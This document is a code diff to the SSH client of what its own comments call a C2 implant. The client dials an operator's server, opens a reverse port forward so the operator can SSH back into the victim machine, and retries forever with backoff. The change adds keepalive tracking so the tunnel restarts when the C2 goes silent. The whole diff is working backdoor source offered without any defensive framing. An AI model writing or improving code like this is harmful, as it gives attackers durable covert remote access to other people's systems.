@@ -2,6 +2,7 @@
 
 #include <libssh/libssh.h>
 #include <libssh/server.h>
+#include <libssh/callbacks.h>
 
 #include <stdio.h>
 #include <thread>
@@ -225,10 +226,9 @@ void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int 
  * lport:   port to forward to once tunnel established  // usually 22 for us 2222
  * rport:   port the ssh server will be listening on    // we will do in the C2: ssh localhost -p [rport]
  */
-int SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t* mutex) {
+void SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t* mutex, std::chrono::time_point<std::chrono::system_clock>* last_keep_alive) {
     debug("[OTCP] Opening port T:%d on server...\n", lport);
     int bounded_port = 0;
-    int ret = 0;
 #ifdef IS_DEBUG
 	int remote_liste_port = 1234;
 #else
@@ -237,7 +237,6 @@ int SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t
     auto rc = ssh_channel_listen_forward(sess, "127.0.0.1", remote_liste_port, &bounded_port);
     if (rc != SSH_OK) {
         debug("[DEBUG] failed: %s\n", ssh_get_error(sess));
-        ret = 1;
         goto clean;
     }
     debug("Check port %d in remote server\n", bounded_port?bounded_port:remote_liste_port);
@@ -247,10 +246,16 @@ int SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t
         int dport = 0;	// The port bound on the server, here: 8080
         debug("[OTCP] Waiting for incoming connection...\n");
 
+        // Check if server sent us a keep alive message recently, if not, restart connection with server 
+        std::chrono::duration<double> elapsed_seconds = std::chrono::system_clock::now() - *last_keep_alive;       
+        if (elapsed_seconds.count() > 150) {
+            goto clean;
+        }
 
         pthread_mutex_lock(mutex);
         chan = ssh_channel_accept_forward(sess, ACCEPT_FORWARD_TIMEOUT, &dport);
         pthread_mutex_unlock(mutex);
+
         if (chan == NULL) {
             if (!ssh_is_connected(sess)) {
                 goto clean;
@@ -258,7 +263,6 @@ int SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t
 
             if (ssh_get_error_code(sess) != 0) {	/* Timed out */
                 //debug("[DEBUG] failed: code: %d msg: %s\n", ssh_get_error_code(sess), ssh_get_error(sess));
-                ret = 1;
                 goto clean;
             }
             else {
@@ -284,9 +288,29 @@ clean:
         ssh_free(sess);
         sess = nullptr;
     }
-    return ret;
 }
 
+void SSHClient::global_requests_cb(ssh_session session, ssh_message message, void* userdata) {
+    auto type = ssh_message_type(message);
+    auto subtype = ssh_message_subtype(message);
+    std::chrono::time_point<std::chrono::system_clock>* last_keep_alive;
+    switch (type)
+    {
+    case SSH_REQUEST_GLOBAL:
+        switch (subtype)
+        {
+        case SSH_GLOBAL_REQUEST_KEEPALIVE:
+            last_keep_alive = (std::chrono::time_point<std::chrono::system_clock>*)userdata;
+            *last_keep_alive = std::chrono::system_clock::now();
+            debug("Got a keep alive message from server\n");
+            break;
+        default:
+            break;
+        }
+    default:
+        break;
+    }
+}
 
 int SSHClient::run(const char* username, const char* host, int port)
 {
@@ -299,6 +323,7 @@ int SSHClient::run(const char* username, const char* host, int port)
 
     int rc;
     int ret = 0;
+    std::chrono::time_point<std::chrono::system_clock> last_keep_alive;
    
     // We use this variable to count how many tries have we try to contact the C2 and do an exponential wait
     // Using the formula (the result is miliseconds): 5 ** (retries/2)
@@ -314,6 +339,13 @@ int SSHClient::run(const char* username, const char* host, int port)
         ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host);
         ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
         ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT_STR, "22");
+
+        struct ssh_callbacks_struct cb = { NULL };
+        cb.global_request_function = global_requests_cb;
+        cb.userdata = &last_keep_alive;
+
+        ssh_callbacks_init(&cb);
+        ssh_set_callbacks(my_ssh_session, &cb);
 
         // Connect to server
         rc = ssh_connect(my_ssh_session);
@@ -338,8 +370,11 @@ int SSHClient::run(const char* username, const char* host, int port)
                 exit(1);
             }
 
+            // Set time to keep track of C2 server down
+            last_keep_alive = std::chrono::system_clock::now();
+
             // do something
-            do_remote_forwarding(my_ssh_session, port, &SSHClient::mutex);
+            do_remote_forwarding(my_ssh_session, port, &SSHClient::mutex, &last_keep_alive);
         }
     } while(!should_terminate); // When the clients disconnects we try to reconnect it again
 
